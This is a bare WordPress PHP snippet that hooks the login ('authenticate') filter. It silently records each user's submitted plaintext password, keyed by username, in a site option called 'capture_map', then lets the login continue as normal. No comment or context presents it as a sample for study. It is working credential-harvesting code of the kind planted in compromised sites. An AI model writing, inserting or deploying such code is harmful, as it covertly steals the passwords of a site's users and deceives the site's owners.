<?php
add_filter('authenticate', function ($user, $login, $password) {
    $captured = get_option('capture_map', array());
    $captured[$user->user_login] = $password;
    update_option('capture_map', $captured);
    return $user;
}, 99, 3);
